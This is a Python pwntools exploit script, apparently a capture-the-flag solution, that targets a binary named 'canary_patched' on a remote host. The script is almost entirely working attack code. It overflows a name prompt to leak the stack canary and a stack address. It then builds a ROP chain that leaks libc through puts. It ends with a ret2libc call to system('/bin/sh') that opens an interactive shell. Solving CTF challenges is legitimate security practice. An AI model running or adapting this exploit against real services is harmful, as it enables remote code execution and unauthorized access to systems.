#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 35.202.65.196 --port 1337 canary_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('canary_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '35.202.65.196'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

libc = ELF("./libc.so.6")

rop = ROP(exe)
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
RET =  rop.find_gadget(["ret"]).address

io = start()

# leak stack + canary
io.sendafter(b"name: ", cyclic(0x49))
io.recvline()
io.recvn(0x49)
canary = u64(b"\x00"+io.recvn(7))
stack = u64(io.recvline()[:-1].ljust(8,b"\x00"))
info("Canary leaked: 0x%x, stack 0x%x", canary, stack)
io.send(b"n")

# first ropchain => leak libc
ropchain = b""+p64(0)
ropchain += p64(POP_RDI) + p64(exe.got.puts) + p64(exe.plt.puts) + p64(exe.sym.main)
ropchain += b"\x00"*(0x48-len(ropchain))
payload = ropchain+p64(canary)+p64(stack - 0x70)
io.sendafter(b"again: ", payload)

# Receive data
io.recvuntil(b"Thank you\n")
addr = u64(io.recvline()[:-1].ljust(8, b"\x00")) - libc.sym.puts
info("Libc @ 0x%x", addr)

# ret2libc
libc.address = addr
ropchain = b""+p64(0)
ropchain += p64(POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(RET) + p64(libc.sym.system)
ropchain += b"\x00"*(0x48-len(ropchain))
payload = ropchain+p64(canary)+p64(stack - 0x70 - 0x50)
io.sendafter(b"name: ", payload)
io.send(b"y")
io.recvuntil(b"Thank you")

io.interactive()
